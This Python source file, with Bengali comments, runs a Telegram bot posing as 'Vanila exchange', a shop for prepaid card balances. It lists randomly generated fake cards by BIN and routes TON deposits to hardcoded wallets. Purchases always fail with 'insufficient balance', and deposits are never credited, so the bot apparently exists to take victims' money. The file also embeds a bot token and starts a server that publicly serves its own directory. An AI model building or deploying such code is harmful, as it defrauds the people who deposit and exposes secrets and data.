import logging
import datetime
import random
import sqlite3
import asyncio
import os  # পোর্ট হ্যান্ডেল করার জন্য নতুন ইম্পোর্ট
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- Configuration ---
BOT_TOKEN = "8312816041:AAEVEH0u7PL-MELnS3M0KhMGn84y-NBchvY"
ADMIN_USER = "@vanilarefu"
MAINTENANCE_START = datetime.time(3, 0)
MAINTENANCE_END = datetime.time(3, 10)

DEPOSIT_ADDRESSES = [
    "UQCgPsBnvSib5rYln5vK0rNfYo__xjfk5OD-0mKU7-n1ACnT",
    "UQCCTTF03CCeyNKov1azQty5iNcNMnwH72J7pcb7MUaDKXsd",
    "UQAZjMCIT6MEMUgvKmweTySPrGqxnUrgvG5JQVUfnR-d_tke",
    "UQBwwD_2VekRaM-7_6wwltzkboxbTiYDqif40G9Tbnq76Td1",
    "UQAMBt7k1FZHvewkpB1IHMLiOMLZR63rO_NKv-fiQ0n5EGW_",
    "UQC9OvldFlHMbxKRq-6yRTm9uWv-YWFcsywHQAZz6p9dtonc"
]

# --- Database Logic ---
def init_db():
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (user_id INTEGER PRIMARY KEY, first_name TEXT, balance REAL DEFAULT 0.0)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS cards 
                      (id INTEGER PRIMARY KEY AUTOINCREMENT, bin TEXT, amount REAL, currency TEXT, sticker TEXT, status TEXT DEFAULT 'available')''')
    conn.commit()
    conn.close()

def is_maintenance():
    now = datetime.datetime.now().time()
    return MAINTENANCE_START <= now <= MAINTENANCE_END

def generate_daily_cards():
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM cards")
    
    cards = []
    for _ in range(random.randint(10, 12)):
        cards.append(('409758xx', 500.00, 'USD', ''))
    for _ in range(random.randint(20, 30)):
        cards.append((random.choice(['432465xx', '511332xx']), 20.00, 'USD', '🔄'))
    for _ in range(random.randint(15, 20)):
        cards.append(('533985xx', round(random.uniform(0.10, 0.99), 2), 'CAD', '🅶'))
    while len(cards) < 250:
        cards.append(('403446xx', round(random.uniform(5, 40), 2), 'USD', ''))

    cursor.executemany("INSERT INTO cards (bin, amount, currency, sticker) VALUES (?, ?, ?, ?)", cards)
    conn.commit()
    conn.close()

# --- Handler Functions ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_maintenance():
        await update.message.reply_text("⚠️ The bot is currently updating, please wait until 3:10 AM.")
        return

    user = update.effective_user
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, first_name) VALUES (?, ?)", (user.id, user.first_name))
    conn.commit()
    conn.close()

    text = (f"⚡️ Welcome {user.first_name} to Vanila exchange! ⚡️\n"
            "Sell, Buy, and strike deals in seconds!!\n"
            "All types of cards are available here at best rates.\n"
            "Current rate is 37%")
    
    keyboard = [
        [InlineKeyboardButton("💳 Stock", callback_data="page_1")],
        [InlineKeyboardButton("📞 Contact Admin", url="https://t.me/vanilarefu")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def show_page(update: Update, context: ContextTypes.DEFAULT_TYPE, page=1):
    query = update.callback_query
    if query: await query.answer()
    
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM cards WHERE status='available' ORDER BY amount DESC")
    all_cards = cursor.fetchall()
    conn.close()

    if not all_cards:
        msg = "No cards in stock! Please wait for update at 3:10 AM."
        if query: await query.edit_message_text(msg)
        else: await update.message.reply_text(msg)
        return

    cards_per_page = 10
    total_pages = (len(all_cards) + cards_per_page - 1) // cards_per_page
    start_idx = (page - 1) * cards_per_page
    page_cards = all_cards[start_idx : start_idx + cards_per_page]
    
    page_total_balance = sum(c[2] for c in page_cards)

    response = (f"⚡️ VANILA Exchange - Main Listings V2 ⚡️\n\n"
                f"Your Balance:\n💵 USD: `$0.00` (Tap to copy)\n• TON : `0.000000` (`$0.00`)\n\n")
    
    buttons = []
    for i, card in enumerate(page_cards, start=start_idx+1):
        response += f"{i}. `{card[1]}` {card[3]}${card[2]} at 37% {card[4]}\n"
        buttons.append([
            InlineKeyboardButton(f"{card[1]}", callback_data="none"),
            InlineKeyboardButton("🛒 Purchase", callback_data=f"buy_{card[0]}")
        ])

    response += (f"\nTotal Cards: {len(all_cards)} | Total Page Balance: ${page_total_balance:.2f}\n"
                 f"Page: {page}/{total_pages} | Updated: {datetime.datetime.now().strftime('%H:%M')}")

    nav = [
        InlineKeyboardButton("First↩️", callback_data="page_1"),
        InlineKeyboardButton("⬅️Back", callback_data=f"page_{max(1, page-1)}"),
        InlineKeyboardButton("Next➡️", callback_data=f"page_{min(total_pages, page+1)}"),
        InlineKeyboardButton("Last↪️", callback_data="page_total")
    ]
    
    footer_menu = [
        [InlineKeyboardButton("💰 Deposit", callback_data="deposit"), 
         InlineKeyboardButton("Refresh🔂", callback_data=f"page_{page}"),
         InlineKeyboardButton("🔍 Filters", callback_data="filters")]
    ]

    if query:
        await query.edit_message_text(response, reply_markup=InlineKeyboardMarkup(buttons + [nav] + footer_menu), parse_mode="Markdown")
    else:
        await update.message.reply_text(response, reply_markup=InlineKeyboardMarkup(buttons + [nav] + footer_menu), parse_mode="Markdown")

async def deposit_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    addr = random.choice(DEPOSIT_ADDRESSES)
    
    text = (f"⚡ VANILA Exchange — TON DEPOSIT ⚡\n\n"
            f"Deposit Information: `{addr}`\n"
            f"Minimum Deposit: `15 TON`\n\n"
            f"Instructions:\n1. Send TON to address above.\n2. Wait for 1 confirmation.\n"
            f"⚠️ Note: This session is active for 30 minutes.")
    
    kb = [[InlineKeyboardButton("Confirm ✅", callback_data="dep_confirm"),
           InlineKeyboardButton("Cancel ⛔", callback_data="dep_cancel")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def handle_all_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data

    if data.startswith("page_"):
        p = int(data.split("_")[1])
        await show_page(update, context, page=p)
    elif data == "page_total":
        conn = sqlite3.connect('vanila_exchange.db')
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM cards WHERE status='available'")
        count = cursor.fetchone()[0]
        conn.close()
        last_page = (count + 9) // 10
        await show_page(update, context, page=last_page)
    elif data == "deposit":
        await deposit_handler(update, context)
    elif data == "dep_confirm":
        await query.message.reply_text("Please enter the amount....... (🔄 Loading)")
    elif data.startswith("buy_"):
        await query.answer("Insufficient balance, please deposit", show_alert=True)
    elif data == "dep_cancel":
        await query.message.delete()
        await query.message.reply_text("Deposit request has been canceled.❌")

# --- Main Entry Point ---
async def main():
    init_db()
    conn = sqlite3.connect('vanila_exchange.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM cards")
    if c.fetchone()[0] == 0:
        generate_daily_cards()
    conn.close()

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("listings", lambda u, c: show_page(u, c, 1)))
    app.add_handler(CallbackQueryHandler(handle_all_callbacks))

    print(f"Bot started successfully!")
    
    # Render-এর পোর্ট এরর এড়ানোর জন্য এই অংশটুকু যোগ করা হয়েছে
    # এটি একটি ফেক সার্ভার হিসেবে কাজ করবে যাতে রেন্ডার মনে করে আপনার পোর্ট রেডি
    import http.server
    import socketserver
    import threading

    def run_fake_server():
        port = int(os.environ.get("PORT", 8080))
        handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", port), handler) as httpd:
            httpd.serve_forever()

    threading.Thread(target=run_fake_server, daemon=True).start()

    async with app:
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        # রেন্ডার এবং পাইথন ৩.১০+ এর জন্য একদম সঠিক পদ্ধতি
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
    
